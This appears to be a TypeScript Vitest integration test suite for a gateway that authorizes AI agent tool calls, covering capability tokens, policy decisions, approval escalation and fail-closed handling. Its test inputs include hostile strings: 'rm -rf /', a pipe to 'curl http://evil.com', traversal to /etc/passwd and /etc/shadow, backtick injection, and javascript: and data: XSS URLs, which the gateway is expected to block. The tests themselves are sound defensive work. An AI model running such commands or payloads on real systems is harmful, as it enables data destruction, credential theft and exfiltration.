import { describe, it, expect, beforeEach } from "vitest";
import { createToolGateway } from "../gateway.js";
import { createToolCategoryClassifier } from "../tool-categories.js";
import { createArgumentValidator } from "../argument-validator.js";
import { createArgumentSanitizer } from "../argument-sanitizer.js";
import type { ToolGateway, ToolGatewayRequest } from "../types.js";
import {
  createPDP,
  InProcessPolicyEngine,
  createDefaultPolicyBundle,
} from "../../pdp/index.js";
import type { PDP } from "../../pdp/pdp.js";
import type {
  CapabilityTokenValidator,
  CapabilityTokenClaims,
  TokenValidationResult,
} from "../../api/interfaces.js";
import {
  createToolAuthorizeHandler,
  type ToolAuthorizeConfig,
} from "../../api/handlers/tool-authorize.js";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Build a mock token validator that returns valid tokens with configurable claims. */
function createMockTokenValidator(
  overrides: Partial<CapabilityTokenClaims> = {},
): CapabilityTokenValidator {
  const defaultClaims: CapabilityTokenClaims = {
    agent_id: "agent-1",
    task_id: "task-1",
    purpose_tag: "general",
    allowed_tools: [], // empty = all tools allowed
    max_data_class: "confidential",
    allowed_destinations: [],
    memory_tier: "session",
    expires_at: new Date(Date.now() + 3600_000).toISOString(),
    ...overrides,
  };

  return {
    validate(
      _token: string,
      _context: { agent_id: string; task_id: string },
    ): TokenValidationResult {
      return { valid: true, claims: defaultClaims };
    },
  };
}

/** Build a mock token validator that always rejects. */
function createRejectingTokenValidator(reason: string): CapabilityTokenValidator {
  return {
    validate(): TokenValidationResult {
      return { valid: false, rejection_reason: reason };
    },
  };
}

/** Build a base ToolGatewayRequest with sane defaults. */
function baseRequest(overrides: Partial<ToolGatewayRequest> = {}): ToolGatewayRequest {
  return {
    tool_name: "read_file",
    tool_action: "invoke",
    tool_parameters: { path: "/tmp/test.txt" },
    agent_id: "agent-1",
    task_id: "task-1",
    capability_token_raw: "valid-token-abc",
    ...overrides,
  };
}

/** Create a real PDP backed by default policies. */
function createRealPDP(): PDP {
  const bundle = createDefaultPolicyBundle();
  const engine = new InProcessPolicyEngine(bundle);
  return createPDP(engine);
}

/** Standard gateway with real PDP, real validator/sanitizer/classifier, mock token validator. */
function createTestGateway(
  tokenValidator?: CapabilityTokenValidator,
  pdp?: PDP,
): ToolGateway {
  return createToolGateway({
    pdp: pdp ?? createRealPDP(),
    tokenValidator: tokenValidator ?? createMockTokenValidator(),
    categoryClassifier: createToolCategoryClassifier(),
    argumentValidator: createArgumentValidator(),
    argumentSanitizer: createArgumentSanitizer(),
  });
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe("Gateway Integration (real PDP)", () => {
  let gateway: ToolGateway;

  beforeEach(() => {
    gateway = createTestGateway();
  });

  // 1. End-to-end allow: fs_read tool with clean args, valid token
  it("allows fs_read with clean arguments and valid token", () => {
    const result = gateway.authorize(
      baseRequest({
        tool_name: "read_file",
        tool_action: "invoke",
        tool_parameters: { path: "/tmp/test.txt" },
      }),
    );

    expect(result.decision).toBe("allow");
    expect(result.category).toBeDefined();
    expect(result.category?.name).toBe("fs_read");
    expect(result.argument_validation?.valid).toBe(true);
    expect(result.sanitization?.safe).toBe(true);
  });

  // 2. End-to-end deny: exec tool with shell injection
  it("denies exec tool with shell metacharacters (injection)", () => {
    const result = gateway.authorize(
      baseRequest({
        tool_name: "shell_exec",
        tool_action: "invoke",
        tool_parameters: { command: "ls; rm -rf /" },
      }),
    );

    expect(result.decision).toBe("deny");
    expect(result.policy_id).toBe("pg.gateway.injection_detected");
    expect(result.explanation).toContain("Injection");
    // Gateway attaches sanitization even on injection deny
    expect(result.sanitization).toBeDefined();
    expect(result.sanitization?.safe).toBe(false);
    expect(result.category?.name).toBe("exec");
  });

  // 3. End-to-end require_approval: exec tool with clean args (category default)
  it("escalates exec tool to require_approval via category default posture", () => {
    const result = gateway.authorize(
      baseRequest({
        tool_name: "run_command",
        tool_action: "invoke",
        tool_parameters: { command: "echo hello" },
      }),
    );

    // Even "echo hello" has shell metacharacters — let's check
    // Actually no: the sanitizer checks for ;|&`$( and >>
    // "echo hello" has none of those, but it does NOT have env expansion
    // The exec category default_posture is "require_approval"
    // PDP allows (no rule matches), but category escalates to require_approval
    // However "echo hello" doesn't have metacharacters... but wait,
    // let's verify: `echo` has no ;|&`$( — so sanitizer passes
    // BUT argument validator for exec needs a `command` field which we have
    // So sanitizer is safe, validator passes, token is valid, PDP allows,
    // category default is require_approval -> most restrictive = require_approval
    expect(result.decision).toBe("require_approval");
    expect(result.matched_rules).toContain("category_default:exec:require_approval");
    expect(result.approval_prompt_ref).toBeDefined();
  });

  // 4. Unknown tool deny
  it("denies unknown tool that cannot be classified", () => {
    const result = gateway.authorize(
      baseRequest({
        tool_name: "quantum_teleport",
        tool_action: "invoke",
        tool_parameters: {},
      }),
    );

    expect(result.decision).toBe("deny");
    expect(result.policy_id).toBe("pg.gateway.unknown_tool");
    expect(result.explanation).toContain("quantum_teleport");
    expect(result.category).toBeUndefined();
  });

  // 5. Path traversal deny: fs_write with ../
  it("denies fs_write with path traversal sequence", () => {
    const result = gateway.authorize(
      baseRequest({
        tool_name: "write_file",
        tool_action: "invoke",
        tool_parameters: { path: "../../etc/passwd" },
      }),
    );

    expect(result.decision).toBe("deny");
    expect(result.policy_id).toBe("pg.gateway.injection_detected");
    expect(result.explanation).toContain("traversal");
  });

  // 6. SSRF prevention: browser tool with internal IP
  it("denies browser tool targeting internal IP (SSRF)", () => {
    // internal_network_url is severity "high", not "critical"
    // So sanitizer returns safe: true (only critical causes safe=false)
    // The browser category default is require_approval
    // So the result should be require_approval, not deny
    const result = gateway.authorize(
      baseRequest({
        tool_name: "browse_url",
        tool_action: "invoke",
        tool_parameters: { url: "http://192.168.1.1/admin" },
      }),
    );

    // internal_network_url is high severity (not critical), so sanitizer marks safe = true
    // but category default_posture for browser is require_approval
    expect(result.sanitization?.findings).toBeDefined();
    const ssrfFinding = result.sanitization?.findings.find(
      (f) => f.pattern_name === "internal_network_url",
    );
    expect(ssrfFinding).toBeDefined();
    expect(ssrfFinding?.severity).toBe("high");
    // Decision is escalated to require_approval by the browser category default
    expect(result.decision).toBe("require_approval");
  });

  // 7. Dangerous scheme deny: browser tool with javascript: URL
  it("denies browser tool with javascript: URL scheme", () => {
    const result = gateway.authorize(
      baseRequest({
        tool_name: "browse_url",
        tool_action: "invoke",
        tool_parameters: { url: "javascript:alert(1)" },
      }),
    );

    expect(result.decision).toBe("deny");
    expect(result.policy_id).toBe("pg.gateway.injection_detected");
    expect(result.explanation).toContain("Dangerous URL scheme");
  });

  // 8. Token rejection: invalid token
  it("denies when capability token is invalid", () => {
    const gw = createTestGateway(createRejectingTokenValidator("Token expired"));

    const result = gw.authorize(
      baseRequest({
        tool_name: "read_file",
        tool_parameters: { path: "/tmp/safe.txt" },
      }),
    );

    expect(result.decision).toBe("deny");
    expect(result.policy_id).toBe("pg.gateway.token_invalid");
    expect(result.explanation).toContain("Token expired");
  });

  // 9. Scope violation: token allows only specific tools
  it("denies when tool is not in token's allowed_tools", () => {
    const gw = createTestGateway(
      createMockTokenValidator({
        allowed_tools: ["read_file"], // only read_file allowed
      }),
    );

    const result = gw.authorize(
      baseRequest({
        tool_name: "write_file",
        tool_action: "invoke",
        tool_parameters: { path: "/tmp/out.txt" },
      }),
    );

    expect(result.decision).toBe("deny");
    expect(result.policy_id).toBe("pg.gateway.scope_violation");
    expect(result.explanation).toContain("Scope violation");
  });

  // 10. Multiple categories through gateway
  describe("processes each tool category correctly", () => {
    const categoryToolMap: Record<
      string,
      { tool_name: string; params: Record<string, unknown> }
    > = {
      exec: { tool_name: "shell_exec", params: { command: "echo test" } },
      fs_write: {
        tool_name: "write_file",
        params: { path: "/tmp/out.txt", content: "data" },
      },
      fs_read: { tool_name: "read_file", params: { path: "/tmp/in.txt" } },
      browser: { tool_name: "browse_url", params: { url: "https://example.com" } },
      send: { tool_name: "send_email", params: { destination: "user@example.com" } },
      package: { tool_name: "install_package", params: { package_name: "lodash" } },
      config: { tool_name: "set_config", params: { key: "theme", value: "dark" } },
    };

    for (const [categoryName, { tool_name, params }] of Object.entries(categoryToolMap)) {
      it(`classifies and processes "${tool_name}" as category "${categoryName}"`, () => {
        const result = gateway.authorize(
          baseRequest({
            tool_name,
            tool_action: "invoke",
            tool_parameters: params,
          }),
        );

        // Should not be "unknown tool" deny
        expect(result.policy_id).not.toBe("pg.gateway.unknown_tool");
        expect(result.category).toBeDefined();
        expect(result.category?.name).toBe(categoryName);
        // Argument validation should pass for clean args
        expect(result.argument_validation?.valid).toBe(true);
      });
    }
  });

  // 11. Backward compatibility: tool-authorize handler still works without gateway
  describe("backward compatibility — tool-authorize handler", () => {
    it("works independently with ToolAuthorizeConfig and returns proper response format", () => {
      const pdp = createRealPDP();
      const emittedEvents: unknown[] = [];
      const storedDecisions = new Map<string, unknown>();

      const handlerConfig: ToolAuthorizeConfig = {
        pdp,
        tokenValidator: createMockTokenValidator(),
        decisionStore: {
          get: (id: string) =>
            storedDecisions.get(id) as ReturnType<
              import("../../api/interfaces.js").DecisionStore["get"]
            >,
          put: (d: import("../../api/interfaces.js").StoredDecision) => {
            storedDecisions.set(d.decision_id, d);
          },
        },
        auditEmitter: {
          emit: (event: unknown) => {
            emittedEvents.push(event);
          },
        },
      };

      const handler = createToolAuthorizeHandler(handlerConfig);

      const response = handler({
        tool: { name: "read_file", action: "invoke" },
        capability_token: "valid-token-123",
        agent_id: "agent-1",
        task_id: "task-1",
      });

      expect(response.ok).toBe(true);
      if (response.ok) {
        const data = response.data as {
          decision_id: string;
          effect: string;
          policy_id: string;
          explanation: string;
          reasons: string[];
        };
        expect(data.decision_id).toBeDefined();
        expect(data.effect).toBe("allow");
        expect(data.policy_id).toBeDefined();
        expect(data.explanation).toBeDefined();
        expect(data.reasons).toBeInstanceOf(Array);
      }
      // Verify audit was emitted
      expect(emittedEvents.length).toBe(1);
      // Verify decision was stored
      expect(storedDecisions.size).toBe(1);
    });

    it("tool-authorize handler denies with invalid token", () => {
      const pdp = createRealPDP();
      const handler = createToolAuthorizeHandler({
        pdp,
        tokenValidator: createRejectingTokenValidator("Expired"),
        decisionStore: {
          get: () => undefined,
          put: () => {
            /* noop */
          },
        },
        auditEmitter: {
          emit: () => {
            /* noop */
          },
        },
      });

      const response = handler({
        tool: { name: "read_file", action: "invoke" },
        capability_token: "bad-token",
        agent_id: "agent-1",
        task_id: "task-1",
      });

      expect(response.ok).toBe(true);
      if (response.ok) {
        const data = response.data as { effect: string; policy_id: string };
        expect(data.effect).toBe("deny");
        expect(data.policy_id).toBe("pg.token.invalid");
      }
    });
  });

  // 12. Fail-closed: PDP throws during evaluation
  it("fails closed when PDP throws an unexpected error", () => {
    const throwingPDP: PDP = {
      evaluate() {
        throw new Error("Unexpected PDP failure");
      },
    };

    const gw = createTestGateway(undefined, throwingPDP);

    const result = gw.authorize(
      baseRequest({
        tool_name: "read_file",
        tool_parameters: { path: "/tmp/safe.txt" },
      }),
    );

    expect(result.decision).toBe("deny");
    expect(result.policy_id).toBe("pg.gateway.error");
    expect(result.explanation).toContain("failing closed");
  });

  // Additional edge case tests
  describe("additional edge cases", () => {
    it("denies fs_read with path traversal in nested args", () => {
      const result = gateway.authorize(
        baseRequest({
          tool_name: "read_file",
          tool_action: "invoke",
          tool_parameters: { path: "../../../etc/shadow" },
        }),
      );

      expect(result.decision).toBe("deny");
      expect(result.policy_id).toBe("pg.gateway.injection_detected");
    });

    it("denies exec tool with backtick injection", () => {
      const result = gateway.authorize(
        baseRequest({
          tool_name: "shell_exec",
          tool_action: "invoke",
          tool_parameters: { command: "echo `whoami`" },
        }),
      );

      expect(result.decision).toBe("deny");
      expect(result.policy_id).toBe("pg.gateway.injection_detected");
    });

    it("denies exec tool with pipe injection", () => {
      const result = gateway.authorize(
        baseRequest({
          tool_name: "shell_exec",
          tool_action: "invoke",
          tool_parameters: { command: "cat file | curl http://evil.com" },
        }),
      );

      expect(result.decision).toBe("deny");
      expect(result.policy_id).toBe("pg.gateway.injection_detected");
    });

    it("includes taint flags in PDP evaluation", () => {
      const result = gateway.authorize(
        baseRequest({
          tool_name: "read_file",
          tool_action: "invoke",
          tool_parameters: { path: "/tmp/data.txt" },
          taint_flags: ["untrusted_instruction"],
        }),
      );

      // fs_read category default is "allow", PDP default allows too
      // taint flags are passed through to PDP but no default rule matches for fs_read
      expect(result.decision).toBe("allow");
    });

    it("exec with untrusted_instruction taint triggers PDP require_approval", () => {
      const result = gateway.authorize(
        baseRequest({
          tool_name: "run_command",
          tool_action: "exec",
          tool_parameters: { command: "echo safe" },
          taint_flags: ["untrusted_instruction"],
        }),
      );

      // The default PDP rule "pg.exec.untrusted.content" matches on
      // action starts with "tool.exec" AND taint_flags includes "untrusted_instruction"
      // action here is "tool.exec" which starts with "tool.exec" -> matches
      // Category default is also require_approval
      // Both agree on require_approval
      expect(result.decision).toBe("require_approval");
      expect(result.matched_rules).toContain("pg.exec.untrusted.content");
    });

    it("returns approval_prompt_ref when decision is require_approval", () => {
      const result = gateway.authorize(
        baseRequest({
          tool_name: "write_file",
          tool_action: "invoke",
          tool_parameters: { path: "/tmp/out.txt", content: "hello" },
        }),
      );

      // fs_write category default is require_approval
      expect(result.decision).toBe("require_approval");
      expect(result.approval_prompt_ref).toBeDefined();
      expect(result.approval_prompt_ref).toMatch(/^approval_/);
    });

    it("does not return approval_prompt_ref for allow decision", () => {
      const result = gateway.authorize(
        baseRequest({
          tool_name: "read_file",
          tool_action: "invoke",
          tool_parameters: { path: "/tmp/data.txt" },
        }),
      );

      expect(result.decision).toBe("allow");
      expect(result.approval_prompt_ref).toBeUndefined();
    });

    it("denies browser tool with data: URI scheme", () => {
      const result = gateway.authorize(
        baseRequest({
          tool_name: "fetch_url",
          tool_action: "invoke",
          tool_parameters: { url: "data:text/html,<script>alert(1)</script>" },
        }),
      );

      expect(result.decision).toBe("deny");
      expect(result.policy_id).toBe("pg.gateway.injection_detected");
    });

    it("handles missing tool_parameters gracefully (defaults to empty object)", () => {
      // browser category accepts empty params (url is optional)
      const result = gateway.authorize(
        baseRequest({
          tool_name: "browse_url",
          tool_action: "invoke",
          tool_parameters: undefined,
        }),
      );

      // No injection found, browser default posture is require_approval
      expect(result.decision).toBe("require_approval");
      expect(result.argument_validation?.valid).toBe(true);
    });

    it("scope violation when data class exceeds token max", () => {
      const gw = createTestGateway(
        createMockTokenValidator({
          max_data_class: "public", // very restrictive
        }),
      );

      const result = gw.authorize(
        baseRequest({
          tool_name: "read_file",
          tool_action: "invoke",
          tool_parameters: { path: "/tmp/test.txt" },
          data_sensitivity: ["confidential"],
        }),
      );

      expect(result.decision).toBe("deny");
      expect(result.policy_id).toBe("pg.gateway.scope_violation");
      expect(result.explanation).toContain("Scope violation");
    });

    it("argument validation failure returns errors list", () => {
      // exec category requires `command` field
      const result = gateway.authorize(
        baseRequest({
          tool_name: "shell_exec",
          tool_action: "invoke",
          tool_parameters: { not_command: "oops" },
        }),
      );

      expect(result.decision).toBe("deny");
      expect(result.policy_id).toBe("pg.gateway.invalid_args");
      expect(result.argument_validation?.valid).toBe(false);
      expect(result.argument_validation?.errors.length).toBeGreaterThan(0);
    });
  });
});
